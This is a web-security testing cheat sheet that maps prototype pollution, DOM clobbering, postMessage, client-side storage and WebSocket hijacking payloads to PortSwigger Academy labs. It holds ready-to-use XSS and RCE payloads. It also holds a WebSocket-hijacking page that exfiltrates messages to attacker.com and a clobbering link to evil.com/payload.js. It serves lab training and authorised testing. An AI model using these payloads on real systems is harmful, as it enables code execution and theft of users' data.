# 06 — Combined Cheatsheet and Lab Mapping

Quick-reference companion to files `01`–`05`. Keep this open during active testing; full
mechanism explanations live in the dedicated per-topic files — this file intentionally
does not re-explain *why* each payload works, only *what* to try and *where* to look.

---

## 1. Prototype Pollution

**Find a source:**
```
?__proto__[foo]=bar
#__proto__[foo]=bar
{"__proto__":{"foo":"bar"}}
```
Check: `Object.prototype.foo` in console (client-side) / observe response behavior change
(server-side, blind).

**Bypass naive `__proto__` filters:**
```
{"constructor":{"prototype":{"foo":"bar"}}}
```

**Client-side XSS gadget (data: URI):**
```
?__proto__[transport_url]=data:,alert(1);//
```

**Server-side blind detection (no reflection):**
```json
{"__proto__": {"json spaces": 10}}
```
Watch for JSON response indentation change.

**Server-side RCE gadget (Node.js `child_process`):**
```json
{"__proto__": {"execArgv": ["--eval=require('child_process').execSync('curl https://COLLAB-ID.oastify.com')"]}}
```

**Tooling:** DOM Invader (client-side source/gadget scanning), Burp's
Server-Side Prototype Pollution Scanner extension (BApp Store).

---

## 2. DOM Clobbering

**Single-level clobber:**
```html
<a id="someObject" href="javascript:alert(1)">x</a>
```

**Two-level clobber (shared id + name):**
```html
<a id="x"></a><a id="x" name="y" href="https://evil.com/payload.js">y</a>
```

**CSP-bypass quote-smuggling via `cid:` (DOMPurify-specific):**
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

**Clobbering `attributes` to defeat a sanitizer's filter loop:**
```html
<form id="x"><input id="attributes"></form>
```

**Vulnerable pattern to grep for in source:**
```
window.X || 
var X = X ||
```

**Tooling:** DOM Invader (DOM clobbering scan + gadget identification).

---

## 3. postMessage Vulnerabilities

**Generic missing-origin-check probe:**
```html
<iframe src="https://TARGET/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

**JSON-structured message, unsafe sink:**
```html
<iframe src="https://TARGET/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

**Bypassing flawed `indexOf` content checks:**
```
javascript:print()//http:
```

**Flawed origin checks to test for (read the actual comparison logic):**
```
e.origin.indexOf('target.com') > -1     // substring bypass: attacker.target.com.evil.net
e.origin.startsWith('https://target')   // bypass: https://target.evil.net
e.origin.endsWith('target.com')         // bypass: https://eviltarget.com
```

**Correct check to verify against (should be present for a non-finding):**
```js
if (e.origin !== 'https://expected-origin.com') return;
```

**Tooling:** DOM Invader (Postmessage interception: logs every message, flags
`origin`/`data`/`source` access, can auto-spoof origins to catch `startsWith`/`endsWith`
flaws).

---

## 4. Client-Side Storage Issues

**Manual recon checklist:**
```
DevTools → Application → Local Storage / Session Storage  → inventory every key
DevTools → Sources → search ".setItem(" → trace source
DevTools → Sources → search ".getItem(" → trace sink
```

**Red-flag values to report regardless of a working XSS chain:**
```
authToken / jwt / session / access_token stored in localStorage or sessionStorage
```

**Storage-as-XSS-source pattern to test for:**
```js
localStorage.setItem('key', location.search)   // write
... innerHTML = localStorage.getItem('key')     // read, different page load
```

**No dedicated Academy lab exists for this topic — closest analog:** Stored DOM XSS
(`cross-site-scripting/dom-based/lab-dom-xss-stored`), reasoning about storage as a
persistence layer instead of a server-side database.

---

## 5. Cross-Site WebSocket Hijacking

**Exploit page skeleton:**
```html
<script>
  var ws = new WebSocket('wss://TARGET/chat');
  ws.onopen = function() { ws.send("READY"); };
  ws.onmessage = function(event) {
    fetch('https://attacker.com/log?data=' + encodeURIComponent(event.data));
  };
</script>
```

**Pre-flight checks before assuming exploitability:**
```
1. Is the session cookie SameSite=Strict or SameSite=Lax? → likely mitigated
2. Does the server validate Origin on the handshake? → check via Burp Repeater, resend
   handshake with a modified Origin header and see if the connection still upgrades
3. Does the WS protocol require an app-level token/nonce sent as the first message? →
   check whether that token is itself bound to session/origin or just static
```

**Tooling:** Burp Suite Proxy (WebSockets history tab), Repeater (WS message replay,
handshake header modification).

---

## Full PortSwigger Lab Map (Academy Order)

| # | Lab | Topic | Difficulty |
|---|---|---|---|
| 1 | Client-side prototype pollution via browser APIs | Prototype Pollution | Apprentice |
| 2 | DOM XSS via client-side prototype pollution | Prototype Pollution | Practitioner |
| 3 | Client-side prototype pollution in third-party libraries | Prototype Pollution | Practitioner |
| 4 | Detecting server-side prototype pollution without polluted property reflection | Prototype Pollution | Practitioner |
| 5 | Privilege escalation via server-side prototype pollution | Prototype Pollution | Practitioner |
| 6 | Remote code execution via server-side prototype pollution | Prototype Pollution | Expert |
| 7 | DOM XSS exploiting DOM clobbering | DOM Clobbering | Practitioner |
| 8 | Clobbering DOM attributes to bypass HTML filters | DOM Clobbering | Practitioner |
| 9 | DOM XSS using web messages | postMessage | Practitioner |
| 10 | DOM XSS using web messages and a JavaScript URL | postMessage | Practitioner |
| 11 | DOM XSS using web messages and JSON.parse | postMessage | Practitioner |
| — | *(No dedicated lab — Client-Side Storage Issues; see Stored DOM XSS as closest analog)* | Client-Side Storage | — |
| 12 | Manipulating WebSocket messages to exploit vulnerabilities | WebSockets (CSWSH prerequisite) | Apprentice |
| 13 | Manipulating the WebSocket handshake to exploit vulnerabilities | WebSockets (CSWSH prerequisite) | Practitioner |
| 14 | Cross-site WebSocket hijacking | CSWSH | Practitioner |

**Coverage summary:** 14 confirmed labs across 4 of the 5 sub-topics, with one honestly
disclosed gap (Client-Side Storage Issues has no dedicated Academy lab as of this
series's research date).

---

## Cross-Topic Chaining Notes

- **Prototype Pollution → DOM Clobbering:** both are CSP-bypass primitives; a polluted
  property can sometimes itself be the gadget a clobbering chain needs, or vice versa.
- **postMessage → Prototype Pollution:** web messages are an explicitly documented
  pollution *source* — `JSON.parse()` on `e.data` carries the same `__proto__`-as-real-key
  behavior covered in file `01`.
- **postMessage → Client-Side Storage:** a compromised postMessage handler that writes
  `e.data` into `localStorage` without validation combines the missing-origin-check
  finding with a storage-based persistence/XSS finding — report both root causes
  separately even when chained in one PoC.
- **CSWSH → general WebSocket message tampering:** the two prerequisite WebSocket labs
  (handshake/message manipulation) are useful independent of CSWSH for testing
  business-logic flaws over WebSocket channels (e.g., price tampering, privilege
  escalation via forged WS messages) — don't treat them as CSWSH-only skills.
